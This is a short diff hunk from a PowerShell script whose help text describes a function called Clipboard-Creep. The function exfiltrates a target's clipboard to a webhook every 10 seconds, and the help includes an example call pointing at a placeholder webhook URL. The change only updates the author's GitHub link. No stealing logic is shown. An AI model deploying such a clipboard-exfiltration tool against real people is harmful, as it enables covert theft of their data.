@@ -26,7 +26,7 @@ Exfiltrate the targets clipboard content to a defined webhook every 10 seconds.
 Clipboard-Creep -Webhook "https://example.com/" -Sleep 10
 
 .LINK
-https://github.com/0iphor13
+https://github.com/0i41E
 #>
     param (
         [int]$Sleep = 12,
